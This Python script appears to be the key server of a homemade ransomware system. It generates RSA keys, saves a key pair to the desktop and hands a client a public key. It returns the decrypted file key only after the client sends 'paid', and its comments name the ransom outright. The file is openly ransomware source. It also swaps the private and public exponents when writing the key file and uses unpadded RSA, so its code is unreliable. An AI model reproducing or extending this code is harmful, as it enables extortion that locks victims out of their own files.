import os
import socket
from cryptography.hazmat.primitives.asymmetric import rsa

SERVER_IP = '172.20.10.2'
SERVER_PORT = 5678


def generate_rsa_key_pair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    private_exponent = private_key.private_numbers().d
    public_exponent = public_key.public_numbers().e
    modulus = public_key.public_numbers().n

    return private_exponent, public_exponent, modulus

def decrypt_key(pk, ciphertext):
    priv, mod = pk
    decrypted = pow(ciphertext, priv, mod)
    plaintext = decrypted.to_bytes((decrypted.bit_length() + 7) // 8, 'big').decode()
    return plaintext

def create_and_move(file_name, file_content):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    file_path = os.path.join(desktop_path, file_name+'.key')

    
    os.makedirs(desktop_path, exist_ok=True)

    # Write to the file
    with open(file_path, 'w') as file:
        file.write(file_content)

    print(f"File '{file_name}' created on the desktop.")

# Save generated RSA key pair in a .key file on desktop
public_exponent, private_exponent, modulus = generate_rsa_key_pair()

file_contentKP = f'{(public_exponent, modulus)}\n{(private_exponent, modulus)}'
file_nameKP = 'keyPair'
create_and_move(file_nameKP, file_contentKP)


### send the public_exp and mod to the client side
#####receive from the client the encrypted_random_key
# this decryption occurs only under the condition that the user has paid the ransome (inserted sum text idk)
##### decrypted_random_key = decrypt_key((private_exponent, modulus), encrypted_random_key)
##### send decrypted_random_key to client
##### client will then decrypt files upon receiving the decrypted_random_key


    

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((socket.gethostname(), SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn,addr = s.accept()
    print(f'Connection accepted from: {addr}')
    
    with conn:
        while(True):

            # Generate RSA key pair
            private_exponent, public_exponent, modulus = generate_rsa_key_pair()

            # Serialize the key components to bytes
            private_exponent_bytes = private_exponent.to_bytes((private_exponent.bit_length() + 7) // 8, 'big')
            public_exponent_bytes = public_exponent.to_bytes((public_exponent.bit_length() + 7) // 8, 'big')
            modulus_bytes = modulus.to_bytes((modulus.bit_length() + 7) // 8, 'big')

            # Send the key components to the client
            conn.send(public_exponent_bytes)
            conn.send(modulus_bytes)

            # Receive data from the client
            encrypted_random_key = conn.recv(2048)
            ## change to int
            encrypted_random_key_int = int.from_bytes(encrypted_random_key, 'big')

            # this decryption occurs only under the condition that the user has paid the ransom (inserted sum text idk)
            text = conn.recv(1024)
            print("received paid", text)
            if(text.decode() == 'paid'):
                print("inside if")
                decrypted_random_key = decrypt_key((private_exponent, modulus), encrypted_random_key_int) ## string
                print("decrypted random key: ", decrypted_random_key)
                print("decrypted random key encoded: ", decrypted_random_key.encode())
                conn.send(decrypted_random_key.encode())

            break
